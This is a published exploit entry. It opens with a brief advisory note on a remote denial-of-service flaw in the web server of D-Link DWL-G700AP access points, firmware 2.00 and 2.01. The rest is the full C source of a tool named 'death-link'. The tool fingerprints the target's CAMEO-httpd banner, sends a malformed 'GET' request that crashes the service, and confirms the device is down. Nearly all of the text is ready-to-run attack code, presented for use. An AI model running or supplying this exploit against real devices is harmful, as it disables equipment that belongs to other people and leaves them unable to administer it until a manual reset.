// source: https://www.securityfocus.com/bid/16690/info

D-Link DWL-G700AP HTTPD is prone to a remote denial-of-service vulnerability. This issue is due to a failure in the 'httpd' service to properly handle malformed data.

An attacker can exploit this issue to crash the affected webserver, effectively denying service to legitimate users. The affected device must be manually reset to restart the affected service.

This issue is reported to affect firmware versions 2.00 and 2.01; other firmware versions may also be vulnerable.

/*
                 death-link.c
                 ------------------------
                 written by l0om
                                 WWW.EXCLUDED.ORG
                 ------------------------
                 exploit tested on firmware: v2.00 and the latest v2.01
                 remote DoS exploit for the CAMEO-httpd which is running on the D-Link
                 Accesspoint DWL-G700AP. After executing this the accesspoint cannot be
                 configured anymore because the only way to administrate the AP is the
                 administration with your browser. you have to reboot the box to get the
                 httpd started again.

                 have phun!

                 // some greetings
                 maximilian, Prof. J. Dealer, Theldens, Commander Jansen, ole, detach,
                 mattball, molke, murfie, vy99
                 excluded.org people, IT31 people

                 // the guys who made exploiting possible with buying this AP
                 joerres, hermanns, schubert

*/


#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define                  DOSSTRING               "GET \n\n"
#define                  TARGET                          "CAMEO-httpd"
#define                  DESTPORT                80

int alive(char *ip);
int check_httpd(char *ip);
void help(void);
void header(void);
int DoS(char *ip);

int main(int argc, char **argv)
{
                 int fd, i, check = 0;
                 char *ip = NULL;

                 header();

                 if(argc > 1)
                                 for(i = 1; i < argc; i++)
                                                 if(argv[i][0] == '-')
                                                                 switch(argv[i][1]) {
                                                                                 case 'o':
                                                                                                 check = 2;
                                                                                                 break;
                                                                                 case 'c':
                                                                                                 check = 1;
                                                                                                 break;
                                                                                 case 'h':
                                                                                                 help();
                                                                                                 break;
                                                                                 default:
                                                                                                 printf("\t>> %s << unknown option\n",argv[i]);
                                                                                                 exit(-1);
                                                                 }
                                                 else ip = argv[i];

                 if(ip == NULL) help();

                 if(check) {
                                 printf("\tchecking target... "); fflush(stdout);
                                 i = check_httpd(ip);
                                 if(i <= 0) {
                                                 printf("faild! ");
                                                 if(!i) printf("invalid target webserver\n");
                                                 else printf("webserver already dead?\n");
                                                 exit(-1);
                                 }
                                 else printf("done! valid victim detected\n");
                                 if(check == 2) return 0;
                 }

                 printf("\tsending DoS... "); fflush(stdout);
                 if(DoS(ip) <= 0) {
                                 printf("faild!\n");
                                 return -1;
                 } else printf("done!\n");

                 sleep(1);
                 printf("\tchecking webserver status... "); fflush(stdout);
                 if(!alive(ip)) printf("%s DEAD\n",TARGET);
                 else printf("%s on %s is still alive :( \n",TARGET,ip);

                 return 0;
}

int check_httpd(char *ip)
{
                 int sockfd, nbytes, len, i = 0;
                 char buf[500], pattern[] = TARGET, *ptr;
                 struct sockaddr_in servaddr;

                 if( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                                 perror("socket");
                                 exit(-1);
                 }
                 servaddr.sin_family = AF_INET;
                 servaddr.sin_port = htons(DESTPORT);
                 servaddr.sin_addr.s_addr = inet_addr(ip);

                 if(connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) == -1)
                                 return -1;

                 if(!write(sockfd, "GET / HTTP/1.0\n\n", 16))
                                 return 0;
                 else nbytes = read(sockfd, buf, 500);

                 len = strlen(pattern);
                 ptr = buf;

                 while(nbytes--) {
                                 if(*ptr == pattern[i])
                                                 i++;
                                 else i = 0;
                                 if(i == len) return 1;
                                 else ptr++;
                 }
                 return 0;
}

int alive(char *ip)
{
                 int sockfd, nbytes, len, i = 0;
                 char buf[500], pattern[] = TARGET, *ptr;
                 struct sockaddr_in servaddr;

                 if( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                                 perror("socket");
                                 exit(-1);
                 }
                 servaddr.sin_family = AF_INET;
                 servaddr.sin_port = htons(DESTPORT);
                 servaddr.sin_addr.s_addr = inet_addr(ip);

                 if(connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) == -1)
                                 return 0;
                 else return 1;
}

int DoS(char *ip)
{
                 int sockfd, nbytes, len, i = 0;
                 char buf[500], pattern[] = TARGET, *ptr;
                 struct sockaddr_in servaddr;

                 if( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                                 perror("socket");
                                 exit(-1);
                 }
                 servaddr.sin_family = AF_INET;
                 servaddr.sin_port = htons(DESTPORT);
                 servaddr.sin_addr.s_addr = inet_addr(ip);

                 if(connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) == -1)
                                 return 0;
                 else return(write(sockfd, DOSSTRING, strlen(DOSSTRING)));
}

void help(void)
{
                 printf("\tdeath-link [options] <ip-address>\n");
                 printf("\t-o: ONLY CHECK for valid target\n");
                 printf("\t-c: check for valid target\n");
                 printf("\t-h: help\n");
                 exit(0);
}

void header(void)
{
                 printf("\tdeath-link - written by l0om\n");
                 printf("\t     WWW.EXCLUDED.ORG\n");
                 printf("\tDoS %s D-Link DWL-G700AP\n\n",TARGET);
}